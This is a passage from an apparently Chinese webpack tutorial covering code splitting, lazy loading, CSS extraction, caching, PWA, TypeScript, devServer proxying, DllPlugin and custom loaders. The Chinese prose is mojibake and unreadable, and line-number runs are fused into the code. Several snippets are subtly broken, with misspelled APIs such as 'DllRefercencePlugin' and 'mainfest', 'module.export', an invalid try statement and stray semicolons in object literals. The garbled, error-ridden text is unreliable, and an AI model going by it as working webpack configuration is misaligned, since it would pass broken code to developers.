node_modules é‡Œé¢ï¼Œç¬¦åˆè¿™ä¸ªç»„æ‰“åŒ…å‡ºæ¥çš„æ–‡ä»¶å‰ç¼€ä¼šæœ‰vendors~å…¥å£.js test: /[\\/]node_modules[\\/]/, // ä¼˜å…ˆçº§ ç¬¦åˆ åœ¨ node_modules ä¼˜å…ˆçº§å¤§äºŽåœ¨é»˜è®¤çš„ï¼Œé‚£ä¹ˆæ‰“åŒ…å°±ä¼šæ‰“åŒ…åœ¨ vendors è¿™ä¸ªç›¸å…³é…ç½®é‡Œé¢ priority: -10, // å¼ºåˆ¶å®šä¹‰åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œå¯ä»¥ä¸é…ç½® filename:'vendors.js' &#125;, // é»˜è®¤å¤„ç†é€”å¾„ default: &#123; minChunks: 2, priority: -20, // å¦‚æžœ æ¨¡å—åœ¨å‰é¢æ‰“åŒ…è¿‡äº†å°±ä¸ä¼šé‡å¤æ‰“åŒ… reuseExistingChunk: trueï¼Œ filename:'common.js' &#125; &#125; &#125; &#125;&#125;; Lazy loading æ‡’åŠ è½½é€šè¿‡ import è¯­æ³•æ¥å¼‚æ­¥åŠ è½½ï¼Œä»€ä¹ˆæ—¶å€™è¦ä½¿ç”¨åˆ™æ˜¯å–å†³äºŽä¸ªäºº 1234567891011121314151617181920212223242526function getComponent()&#123; return import(/* webpackChunkName:"lodash" */'lodash').then((&#123;default:_&#125;) =&gt;&#123; const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element; &#125;)&#125;document.addEventListener('click',()=&gt;&#123; getComponent().then(element=&gt;&#123; document.body.appendChild(element); &#125;);&#125;)// async await æ”¹è¿›async function getComponent()&#123; const &#123;default:_&#125; = await import(/* webpackChunkName:"lodash" */'lodash'); const element = document.createElement('div'); element.innerHTML = _.join(['Dell','Lee'],'_'); return element;&#125;document.addEventListener('click',()=&gt;&#123; getComponent().then(element=&gt;&#123; document.body.appendChild(element); &#125;);&#125;) æ‰“åŒ…åˆ†æžé…ç½® package.json 12345&#123; "scripts":&#123; "dev-build":"webpack --profile --json &gt; stats.json --config ./build/webpack.dev.js" &#125;&#125; ä¸Šé¢ä»£ç çš„æ„æ€æ˜¯åˆ†æžwebapck æ‰“åŒ…çš„æ–‡ä»¶ç”ŸæˆåŽç”Ÿæˆ stats.json ã€‚ ç‚¹å‡»è¿™ä¸ªç½‘ç«™å¯ä»¥å°†è¿™ä¸ªjson æ–‡ä»¶ä¸Šä¼ ï¼Œä¼šå¸®ä½ è‡ªåŠ¨åˆ†æžç‰ˆæœ¬ï¼Œæ—¶é•¿ä»¥åŠç›¸å…³é”™è¯¯ï¼Œæ¨¡å—ä¹‹é—´çš„å…³ç³»ç­‰ç­‰ æ›´å¤šç›¸å…³å·¥å…· Preloading,Prefetchingåœ¨è°·æ­Œæµè§ˆå™¨ ctrl+shift+p è¾“å…¥show Coverage ç‚¹å‡»å½•åˆ¶åŽå¯ä»¥çœ‹åˆ°ä¸€ä¸ªç½‘ç«™é¦–å±åŠ è½½ js æ–‡ä»¶çš„åˆ©ç”¨çŽ‡ï¼Œä»¥åŠå¯ä»¥ä¼˜åŒ–çš„å¯èƒ½ã€‚ 12345678910111213// å½“æµè§ˆå™¨ç©ºé—²çš„æ—¶å€™ï¼Œå¯ä»¥å…ˆåŠ è½½è¿™ä¸ªæ–‡ä»¶document.addEventListener('click',()=&gt;&#123; import(/* webpackPrefetch:true*/'./click.js').then((&#123;default:func&#125;)=&gt;&#123; func(); &#125;)&#125;)// è¿™ä¸ªåˆ™æ˜¯å’Œæ ¸å¿ƒæ–‡ä»¶ä¸€èµ·åŠ è½½document.addEventListener('click',()=&gt;&#123; import(/* webpackPreloading:true*/'./click.js').then((&#123;default:func&#125;)=&gt;&#123; func(); &#125;)&#125;) æ€§èƒ½ä¼˜åŒ–åœ¨ç¼“å­˜ä¸Šé¢å¯ä»¥ä¼˜åŒ–çš„åœ°æ–¹æœ‰é™ï¼Œå¯ä»¥è€ƒè™‘æ›´å¤šæ˜¯ä»£ç çš„ä½¿ç”¨çŽ‡ï¼Œå°†ä¸€å¼€å§‹ä¸ä¼šç”¨çš„ä»£ç å°½é‡ä½¿ç”¨å¼‚æ­¥åŠ è½½çš„æ–¹å¼æ¥åŠ è½½ CSS æ–‡ä»¶çš„ä»£ç åˆ†å‰²mini-css-extract-plugin,æ²¡æœ‰å®žçŽ° HMR éœ€è¦æ‰‹åŠ¨é…ç½®ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯é€‚ç”¨åœ¨çº¿ä¸ŠçŽ¯å¢ƒä½¿ç”¨ã€‚ é…ç½®å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131// webpack.common.jsconst path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');module.exports = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, loader:'babel-loader' &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns:[path.resolve(__dirname,'../dist')], &#125;), ], optimization:&#123; usedExports:true, splitChunks:&#123; chunks:'all' &#125; &#125;, output: &#123; publicPath: './', filename: '[name].js', path: path.resolve(__dirname, '../dist') &#125;&#125;// webpack.dev.jsconst webpack = require('webpack');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, module:&#123; rules:[ &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125; ] &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], optimization:&#123; &#125;&#125;module.exports = merge(commonConfig,devConfig);// webpack.prod.jsconst MiniCssExtractPlugin = require('mini-css-extract-plugin');const merge = require('webpack-merge');const commonConfig = require('./webpack.common.js');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map', plugins:[ new MiniCssExtractPlugin(&#123; // template è¦å¼•å…¥çš„ filename:'[name].css', // é—´æŽ¥å¼•å…¥çš„èµ°è¿™ä¸ª chunkFilename:'[name].chunk.css' &#125;) ], module:&#123; rules:[ &#123; test: /\.scss$/, use: [ MiniCssExtractPlugin.loader, &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader'] &#125; ] &#125;&#125;module.exports = merge(commonConfig,prodConfig); å°†ä¹‹å‰å…±åŒé…ç½®çš„ webpack,common.js module rules é‡Œé¢å…³äºŽcss çš„é…ç½®ç§»åŠ¨åˆ° webpack.dev.js é‡Œé¢ä¸ä½œä¿®æ”¹ã€‚ç„¶åŽåŒæ ·å¤åˆ¶ä¸€éåˆ° webpack.prod.js é‡Œé¢ï¼ŒæŠŠå…³äºŽcss-loader é‡Œé¢çš„çš„ style-loader æ¢æˆ MiniCssExtractPlugin.loader ä½œä¸ºæœ€åŽä¸€æ­¥æ¥å¤„ç†ã€‚ ä¸€ä¸ªè¦æ³¨æ„çš„ç‚¹æ˜¯åœ¨å…¬å…±çš„ optimization é‡Œé¢åŠ äº†ä¸€ä¸ª usedExportsï¼štrue,åŒæ—¶ä¹Ÿè¦åœ¨ package.json é‡Œé¢é…ç½® sideEffectsï¼š[â€˜@babel/polyfillâ€™,â€™*.cssâ€™] è¿è¡Œ npm run build ä¾¿å¯ä»¥æ‰“åŒ…åˆ†å‰²å¼€ css æ–‡ä»¶äº† åŽ‹ç¼© css ä»£ç optimize-css-assets-webpack-plugin 123456789// webpack.prod.jsconst OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');module.exports =&#123; optimization:&#123; minimizer:[ new OptimizeCSSAssetPlugin(&#123;&#125;) ] &#125;&#125; å¤šä¸ªcssæ–‡ä»¶æ‰“åŒ…åˆ°åŒä¸€ä¸ªcssé‡Œé¢12345678910111213141516// webpack.prod.jsmodule.exports =&#123; optimization:&#123; // åº•å±‚ä¾æ—§æ˜¯ splitChunks å®žçŽ°çš„ splitChunks:&#123; cacheGroups:&#123; styles:&#123; name:'styles', test:/\.css$/, chunks:'all', enforce:true &#125; &#125; &#125; &#125;&#125; å¤šä¸ªcssæ–‡ä»¶æŒ‰å…¥å£æ–‡ä»¶æ¥æ‰“åŒ…123456789101112131415161718192021// webpack.prod.jsmodule.exports = &#123; optimization:&#123; splitChunks:&#123; cacheGroups:&#123; fooStyles:&#123; name:'foo', test: (m, c, entry = 'foo') =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks:'all', enforce:true &#125;, barStyles:&#123; name:'bar', test: (m, c, entry = 'foo') =&gt; m.constructor.name === 'CssModule' &amp;&amp; recursiveIssuer(m) === entry, chunks:'all', enforce:true &#125; &#125; &#125; &#125;&#125; Webpack ä¸Žæµè§ˆå™¨ç¼“å­˜ï¼ˆCachingï¼‰å¢žåŠ  hash å€¼,å¦‚æžœæ–‡ä»¶æ²¡æœ‰æ”¹å˜çš„è¯ï¼Œé‚£ä¹ˆæ‰“åŒ…å‰åŽå‡ æ¬¡æ‰“åŒ…å‡ºæ¥çš„æ–‡ä»¶é‡Œé¢çš„å“ˆå¸Œå€¼å°±ä¸ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæµè§ˆå™¨çš„ç¼“å­˜ä¹Ÿå°±èµ·åˆ°äº†ä½œç”¨ã€‚å¦‚æžœæ”¹å˜äº†ï¼Œæµè§ˆå™¨åˆ™ä¼šåŽ»è¯·æ±‚å…ˆçš„æ–‡ä»¶è€Œä¸æ˜¯ç»§ç»­ç”¨åŽŸæ¥çš„ç¼“å­˜æ–‡ä»¶ 1234567// webpack.prod.jsmodule.exports =&#123; output:&#123; filename:'[name].[contenthash].js', chunkFilename:'[name].[contenthash].js' &#125;&#125; ä¸Šé¢çš„é…ç½®æ˜¯æ–°ç‰ˆæœ¬çš„webpackç›´æŽ¥æœ‰çš„ï¼Œä½†æ˜¯æ—§ç‰ˆæœ¬çš„ webpack æ¯æ¬¡æ‰“åŒ… hash å€¼éƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼Œå¯ä»¥åœ¨ webpack.common.js é‡Œé¢é…ç½®ä¸€ä¸ªå‚æ•° 1234567module.exports = &#123; optimization:&#123; runtimeChunk:&#123; name:'runtime' &#125; &#125;&#125; è¿™ä¸ªå‚æ•°ä¼šæŠŠæ—§ç‰ˆæœ¬ä¸­çš„ manifest å•ç‹¬æŠ½ç¦»å‡ºæ¥ä¸€ä¸ª runtime å¼€å¤´çš„ jsæ–‡ä»¶é‡Œé¢ï¼Œè¿™ä¸ª æ–‡ä»¶ä¸»è¦æè¿°çš„æ˜¯åº“ä¸Žä¸šåŠ¡é€»è¾‘ä»£ç ä¹‹é—´çš„ä¸€äº›å…³ç³»ï¼Œæ—§ç‰ˆæœ¬webpack ä¸­è¿™ä¸ªå…³ç³»ä¼šå› ä¸ºæ¯æ¬¡æ‰“åŒ…è€Œå‘ç”Ÿå˜åŒ–ã€‚ Shimmingè‡ªåŠ¨å¼•å…¥æŸä¸ªåº“123456789module.exports =&#123; plugins:[ new webpack.ProvidePlugin(&#123; _:'lodash', // èŠ±å¼å¼•ç”¨ _join:['lodash','join'] &#125;) ]&#125; å…¨å±€this æŒ‡å‘ windowimports-loader 12345678910111213module.exports =&#123; module:&#123; rules:[&#123; test:/\.js$/, exclude:/node_modules/, use:[&#123; loader:'babel-loader' &#125;,&#123; loader:'imports-loaderï¼Ÿthis=&gt;window' &#125;] &#125;] &#125;&#125; çŽ¯å¢ƒå˜é‡å¯ä»¥è€ƒè™‘ä½¿ç”¨ï¼Œç”¨ä¸ªäººï¼Œå…·ä½“æ˜¯åœ¨ package.json é‡Œé¢ä¼ é€’ä¸€ä¸ª env å‚æ•° 1234567&#123; "scripts": &#123; "dev-build": "webpack --profile --json &gt; stats.json --config ./build/webpack.common.js", "dev": "webpack-dev-server --config ./build/webpack.common.js", "build": "webpack --env.production --config ./build/webpack.common.js" &#125;,&#125; è€Œ å¼€å‘ä¸Žç”Ÿäº§çŽ¯å¢ƒçš„webpack åˆ™æ˜¯éƒ½æ”¾åˆ° common é‡Œé¢æ¥åˆ¤æ–­åˆ†å‘ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158// webpack.dev.jsconst webpack = require('webpack');const path = require('path');const devConfig = &#123; mode: 'development', devtool: 'cheap-module-eval-source-map', devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true &#125;, module:&#123; rules:[ &#123; test: /\.scss$/, use: [ 'style-loader', &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: ['style-loader', 'css-loader', 'postcss-loader'] &#125; ] &#125;, plugins: [ new webpack.HotModuleReplacementPlugin() ], output: &#123; publicPath: './', filename: '[name].js', chunkFilename:'[name].js', path: path.resolve(__dirname, '../dist') &#125;&#125;module.exports = devConfig;// webpack.prod.jsconst MiniCssExtractPlugin = require('mini-css-extract-plugin');const OptimizeCSSAssetsPlugin = require('optimize-css-assets-webpack-plugin');const prodConfig = &#123; mode: 'production', devtool: 'cheap-module-source-map', module:&#123; rules:[ &#123; test: /\.scss$/, use: [ MiniCssExtractPlugin.loader, &#123; loader: 'css-loader', options: &#123; importLoaders: 2, &#125; &#125;, 'sass-loader', 'postcss-loader' ] &#125;, &#123; test: /\.css$/, use: [MiniCssExtractPlugin.loader, 'css-loader', 'postcss-loader'] &#125; ] &#125;, optimization:&#123; minimizer:[ new OptimizeCSSAssetsPlugin(&#123;&#125;) ] &#125;, plugins:[ new MiniCssExtractPlugin(&#123; filename:'[name].css', chunkFilename:'[name].chunk.css' &#125;) ], output: &#123; publicPath: './', filename: '[name].[contenthash].js', chunkFilename:'[name].[contenthash].js', &#125;&#125;module.exports = prodConfig;// webpack.common.jsconst webpack = require('webpack')const path = require('path');const HtmlWebpackPlugin = require('html-webpack-plugin');const CleanWebpackPlugin = require('clean-webpack-plugin');const merge =require('webpack-merge');const devConfig = require('./webpack.dev.js');const prodConfig = require('./webpack.prod.js');const commonConfig = &#123; entry: &#123; main: './src/index.js' &#125;, module: &#123; rules: [&#123; test:/\.js$/, exclude:/node_modules/, use:[&#123; loader:'babel-loader' &#125;,&#123; loader:'imports-loader?this=&gt;window' &#125;] &#125;,&#123; test: /\.(jpg|png|gif)$/, use: &#123; loader: 'url-loader', options: &#123; name: '[name]_[hash].[ext]', outputPath: 'images/', limit: 2048 &#125; &#125; &#125;, &#123; test: /\.(eot|ttf|svg|woff)$/, use: &#123; loader: 'file-loader' &#125; &#125;] &#125;, plugins: [ new HtmlWebpackPlugin(&#123; template: 'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns:[path.resolve(__dirname,'../dist')], &#125;), new webpack.ProvidePlugin(&#123; _:'lodash' &#125;) ], optimization:&#123; usedExports:true, splitChunks:&#123; chunks:'all' &#125; &#125;&#125;module.exports = (env)=&gt;&#123; if(env &amp;&amp; env.production)&#123; return merge(commonConfig,prodConfig) &#125;else&#123; return merge(commonConfig,devConfig) &#125;&#125; Library çš„æ‰“åŒ…ç®€å•é…ç½® 12345678910111213141516// webpack.config.jsconst path = require('path');module.exports = &#123; mode: 'production', entry: './src/index.js', externals: ['lodash'], output: &#123; path:path.resolve(__dirname,'dist'), filename:'library.js', // å¯ä»¥é€šè¿‡ script src=library.js æ¥å¼•ç”¨è¿™ä¸ªåº“ library:'library', // é€šç”¨æ‰“åŒ… CommonJS æˆ–è€… UMDï¼Œä¸Šé¢æ–‡ä»¶çš„æŒ‚è½½å¤„ï¼ˆå¯ä»¥ä¸ºthis æˆ–è€… windowï¼‰ libraryTarget:'umd' &#125;,&#125; PWA(Progressive Web Application) çš„æ‰“åŒ…ç½‘ç«™åœ¨è¢«è®¿é—®è¿‡ä¸€æ¬¡ä¹‹åŽï¼Œå¦‚æžœæœåŠ¡å™¨æŒ‚æŽ‰äº†ï¼Œæµè§ˆå™¨è¿˜å¯ä»¥åˆ©ç”¨ç¼“å­˜æ¥è®¿é—®è¿™ä¸ªç½‘ç«™ã€‚ workbox-webpack-plugin 123456789// é…ç½® webpack.prod.jsmodule.exports = &#123; plugins:[ new WorkboxPlugin.GenerateSW(&#123; clientsClaim:true, skipWaiting:true &#125;) ]&#125; ä¹‹åŽæ‰“åŒ…ç¼–è¯‘çš„æ˜¯æ—¶å€™ä¼šç”Ÿæˆå¤šä¸€ä¸ª service-worker.js æ–‡ä»¶ï¼Œåœ¨é¡¹ç›®ä¸­è¿ç”¨ 12345678// index.jsif('serviceWorker' in navigator)&#123; navigator.serviceWorker.register('/service-worker.js').then(registration=&gt;&#123; console.log('service-worker registed'); &#125;).catch(error=&gt;&#123; console.log('service-worker register error'); &#125;)&#125; è¿™æ ·é…ç½®ä¹‹åŽï¼Œå½“ç”¨æˆ·è®¿é—®è¿‡ä¸€æ¬¡ç½‘ç«™ä¹‹åŽä¾¿ä¼šè¿›è¡Œç¼“å­˜ï¼Œå¦‚æžœå½“æœåŠ¡å™¨æŒ‚æŽ‰çš„æ—¶å€™ï¼Œç”¨æˆ·è¿˜æ˜¯å¯ä»¥åœ¨æµè§ˆå™¨è®¿é—®åˆ°ç½‘ç«™ TypeScript çš„æ‰“åŒ…é…ç½®webpackåŸºæœ¬é…ç½® 1234567891011121314151617const path = require('path');module.exports = &#123; mode:'production', entry:'./src/index.tsx', module:&#123; rules:[&#123; test:/\.tsx?$/, use:'ts-loader', exclude:/node_modules/ &#125;] &#125;, output:&#123; filename:'bundle.js', path:path.resolve(__dirname,'dist'); &#125;&#125; é™¤äº†webpack é…ç½®ä¹‹åŽï¼Œåœ¨ æ‰“åŒ… ts çš„æ—¶å€™è¿˜å¿…é¡»è¦é…ç½®ä¸€ä¸ª tsconfig.json 123456789101112&#123; "compilerOptions": &#123; // å‡ºå£ "outDir": "./dist", // è¦å¤„ç†çš„æ¨¡å— "module": "es6", // ç¼–è¯‘æˆes5çš„ "target": "es5", // è¿è¡Œåœ¨æ–‡ä»¶ä¸­å¼•å…¥å…¶ä»–çš„js "allowJs": true &#125;&#125; å¦‚æžœè¦å¼•å…¥å…¶ä»–çš„åº“ï¼Œä¾‹å¦‚ lodash ï¼Œéœ€è¦å®‰è£…å¯¹åº”çš„è¯´æ˜Žï¼Œ@types/lodash ï¼Œå…·ä½“çš„å¯ä»¥æŸ¥çœ‹è¿™é‡Œ WebpackDevServerå¼€å‘çŽ¯å¢ƒå®žçŽ°è¯·æ±‚ä»£ç†è½¬å‘12345678910111213141516171819202122232425262728293031323334// åŸºæœ¬é…ç½®module.exports = &#123; devServer: &#123; contentBase: './dist', open: true, port: 8080, hot: true, hotOnly: true, proxy: &#123; '/react/api': &#123; // ä»£ç†è½¬å‘çš„url target: 'https://www.dell-lee.com/', // å½“æ˜¯ https çš„æ—¶å€™å¯ä»¥è®¾ç½®è¿™ä¸ªå‚æ•° secure: false, // æ‹¦æˆª bypass: function (req, res, proxyOptions) &#123; if (req.headers.accept.indexOf('html') !== 1) &#123; console.log('Shipping proxy for browser request'); return '/index.html'; &#125; &#125;, // è·¯å¾„é‡å†™ pathRewrite: &#123; 'header.json': 'demo.json' &#125;, // é…ç½® headers ä¸»æœºåä¸Žcookie ç­‰ç­‰ headers:&#123; host:'xx', cookie:'' &#125; &#125;, &#125; &#125;&#125; å…·ä½“æ–‡æ¡£ åº•å±‚æ˜¯ webpack-dev-middleware è§£å†³å•é¡µé¢åº”ç”¨è·¯ç”±é—®é¢˜å½“é…ç½®è·¯ç”±å‘çŽ°æ‰¾ä¸åˆ°å†…å®¹çš„æ—¶å€™ï¼Œå¯ä»¥é…ç½® historyApiFallback ESLint çš„é…ç½®å…ˆå®‰è£… 1npm i eslint -D æŽ¥ç€æ˜¯åˆå§‹åŒ–é…ç½® 1eslint -init é‡‡ç”¨ç›®å‰æµè¡Œ airbnb çš„æ–¹å¼ ä¼šçœ‹åˆ°é¡¹ç›®ç”Ÿæˆä¸€ä¸ª .eslintrc.js å¦‚æžœæ²¡æœ‰ä½¿ç”¨vscode åªèƒ½ç”¨ eslint src å‘½ä»¤è¡Œæ¥æŸ¥çœ‹é”™è¯¯ä¿¡æ¯ å¯ä»¥è¿›è¡ŒåŸºæœ¬é…ç½®ï¼š 12345678910module.exports = &#123; "extends": "airbnb", "parser": "babel-eslint", "rules": &#123; "": 0 &#125;, globals:&#123; document &#125;&#125;; eslint-loaderwebpack ä¹Ÿæœ‰å…ˆå…³çš„é…ç½®ï¼Œä½†æ˜¯ä¼šå½±å“æ‰“åŒ…çš„é€Ÿåº¦ï¼Œä¸€èˆ¬ä¼šå»ºè®®ä½¿ç”¨è¿™ç§æ–¹å¼æ¥é…ç½®ã€‚è¿˜æ˜¯ä½¿ç”¨ vscode çš„æ’ä»¶å¼ 1234567891011121314151617module.exports = &#123; module: &#123; rules: [&#123; test: /\.js$/, exclude: /node_modules/, use: [ &#123; loader: 'babel-loader' &#125;, &#123; loader: 'eslint-loader', options: &#123; // è‡ªåŠ¨ä¿®å¤ fix: true &#125; &#125; ] &#125;&#125; å…·ä½“ç‚¹å‡» devServer é…ç½® overlay å¯ä»¥åœ¨é¡µé¢æç¤ºé”™è¯¯ä¿¡æ¯ webpack æ€§èƒ½ä¼˜åŒ–1.å‡çº§å·¥å…·çš„ç‰ˆæœ¬ï¼ˆnode,npm,yarnï¼‰ 2.loaderï¼ˆinclude/excludeï¼‰åœ¨å°½å¯èƒ½å°‘çš„æ¨¡å—ä¸Šä½¿ç”¨ 3.plugin å°½å¯èƒ½ç²¾ç®€å¯é  4.resolve å‚æ•°åˆç† 123456789module.exports =&#123; resolve:&#123; extensions:['.js','.jsx'], // ä½¿ç”¨åˆ«å alias:&#123; haha:path.resolve(__dirname,'../src/child/'); &#125; &#125;&#125; 5.ä½¿ç”¨ DllPlugin æé«˜æ‰“åŒ…é€Ÿåº¦ add-asset-html-webpack-plugin 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// webpack.dll.js// å°†å…±ç”¨çš„åº“æ”¾åˆ°ä¸€ä¸ªæ–‡ä»¶é‡Œé¢åŽ»å•ç‹¬æ‰“åŒ…ï¼Œç”¨ library æš´éœ²å‡ºæ¥ã€‚ç„¶åŽç”¨ webpack.DllPlugin è¿™ä¸ªæ’ä»¶å¯¹è¿™äº›åº“åˆ†æžå‡ºä¸€ç§æ–‡ä»¶å…³ç³»æ˜ å°„.json æ–‡ä»¶const path = require('path');const webpack =require('webpack');module.exports = &#123; mode: 'production', entry: &#123; vendors: ['lodash'], react: ['react', 'react-dom'], &#125;, output: &#123; filename: '[name].dll.js', path: path.resolve(__dirname, '../dll'), library: '[name]' &#125;, plugins:[ new webpack.DllPlugin(&#123; name:'[name]', path:path.resolve(__dirname,'../dll/[name].manifest.json') &#125;) ]&#125;// åœ¨webpack.common.js æ–‡ä»¶é‡Œé¢é…ç½®ï¼ˆä¹Ÿå¯ä»¥åªé…ç½®ç”Ÿäº§çŽ¯å¢ƒï¼‰,å°†ä¸Šé¢ç”Ÿæˆæ–‡ä»¶æŒ‚è½½åˆ° template index.htmlä¸Šé¢module.exports = &#123; plugins:[ new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll/verndors.dll.js') &#125;), new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll/react.dll.js') &#125;), new webpack.DllRefercencePlugin(&#123; mainfest:path.resolve(__dirname,'../dll/vendors.mainfest.json') &#125;), new webpack.DllRefercencePlugin(&#123; mainfest:path.resolve(__dirname,'../dll/react.mainfest.json') &#125;) ]&#125;// è¿›è¡Œä¼˜åŒ–è‡ªåŠ¨æ³¨å…¥const fs = require('fs');const plugins = [ new HtmlWebpackPlugin(&#123; template:'src/index.html' &#125;), new CleanWebpackPlugin(&#123; cleanOnceBeforeBuildPatterns: [path.resolve(__dirname, '../dist')], &#125;)]const files = fs.readdirSync(path.resolve(__dirname,'../dll'))files.forEach(file=&gt;&#123; if(/.*\.dll.js/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; if(/.*\.mainfest.json/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; &#125;)module.exports = &#123; plugins,&#125; 6.æŽ§åˆ¶åŒ…æ–‡ä»¶çš„å¤§å° 7.thread-loader,parallel-webpack,happypack å¤šè¿›ç¨‹æ‰“åŒ… 8.åˆç†ä½¿ç”¨ sourceMap(ä¿¡æ¯è¶Šè¯¦ç»†æ‰“åŒ…è¶Šä¹…) 9.ç»“åˆæ‰“åŒ…åˆ†æž stats.json ä¼˜åŒ–åˆ†æž 10.å¼€å‘çŽ¯å¢ƒå†…å­˜ç¼–è¯‘ï¼Œæ— ç”¨æ’ä»¶å‰”é™¤ å¤šé¡µé¢æ‰“åŒ…é…ç½®12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// webpack.common.jsmodule.exports = &#123; entry: &#123; main: './src/index.js', list: './src/list.js', &#125;, plugins:[ new HtmlWebpackPlugin(&#123; filename:'index.html', template: 'src/index.html', chunks:['runtime','vendors','main'] &#125;), new HtmlWebpackPlugin(&#123; filename:'list.html', template: 'src/index.html', chunks:['runtime','vendors','list'] &#125;), ] &#125;// ä¼˜åŒ–const configs = &#123; entry: &#123; main: './src/index.js', list: './src/list.js', &#125;, // å…¶ä»–æ‰€æœ‰é…ç½®&#125;const makePlugins = (configs)=&gt;&#123; const plugins = ['å…¶ä»–çš„plugins']; Object.keys(configs.entry).forEach(item=&gt;&#123; plugins.push( new HtmlWebpackPlugin(&#123; template:'src/index.html', filename:`$&#123;item&#125;.html`, chunks:['runtime','vendors','item'] &#125;) ) &#125;) // ä¸Šé¢ä¼˜åŒ–çš„ä»£ç  const files = fs.readdirSync(path.resolve(__dirname,'../dll')) files.forEach(file=&gt;&#123; if(/.*\.dll.js/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; if(/.*\.mainfest.json/.test(file))&#123; plugins.push(new AddAssetHtmlWebpackPlugin(&#123; filepath:path.resolve(__dirname,'../dll',file) &#125;)) &#125; &#125;) return plugins;&#125;configs.plugins = makePlugins(configs);module.export = configs; å¦‚ä½•ç¼–å†™ä¸€ä¸ª Loaderç®€å•çš„å®žçŽ°1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// replaceLoader.js // loader-utils æ˜¯å®˜æ–¹ä¸€ä¸ªç¬¦åˆ loader è§„èŒƒçš„å·¥å…·const loaderUtils = require('loader-utils');module.exports = function (source) &#123; return source.replace('haha', 'world');&#125;// replaceLoaderAsync.js const loaderUtils = require('loader-utils');module.exports = function (source) &#123; const options = loaderUtils.getOptions(this); const callback = this.async(); setTimeout(() =&gt; &#123; const result = source.replace('lbh', options.name); callback(null, result); &#125;, 1000)&#125;// index.jsconsole.log('hello lbh');// webpack.config.jsconst path = require('path');module.exports = &#123; mode: 'development', entry: &#123; main: './src/index.js' &#125;, // loader çš„ä½ç½®ï¼Œå…ˆæŸ¥æ‰¾ node_modules å¦‚æžœæ²¡æœ‰å°±å¾€ä¸‹æ‰¾ï¼Œé‚£ä¹ˆè‡ªå®šä¹‰çš„ loader å°±ä¸ç”¨å†™å…¨è·¯å¾„äº† resolveLoader: &#123; modules: ['node_modules', './loaders'] &#125;, module: &#123; rules: [ &#123; test: /\.js?$/, use: [&#123; loader: 'replaceLoader.js', &#125;, &#123; loader: 'replaceLoaderAsync.js', options: &#123; name: 'haha' &#125; &#125;] &#125; ] &#125;, output: &#123; filename: '[name].js', path: path.resolve(__dirname, 'dist') &#125;&#125; è‡ªå®šä¹‰ loader çš„ç”¨é€”å¾ˆå¤šï¼Œå¯ä»¥æ‹¿æ¥åšä¸€ä¸ªç®€å•çš„é”™è¯¯æ£€éªŒ 123456const loaderUtils = require('loader-utils');module.exports = function (source) &#123; try(function()&#123;&#125;)catch(e)&#123;&#125; return source.replace('haha', 'world');&#125; æˆ–è€…æ˜¯å›½é™…åŒ–,åœ¨ç›¸å…³é¡µé¢å¼„ä¸€ä¸ªå ä½ç¬¦ 1234567module.exports = function (source) &#123; if(Nodeå…¨å±€å˜é‡ === 'ä¸­æ–‡')&#123; source.replace('&#123;&#123;title&#125;&#125;', 'ä¸­æ–‡æ ‡é¢˜'); &#125;else&#123; source.replace('&#123;&#123;title&#125;&#125;', 'engilsh title'); &#125; &#125; 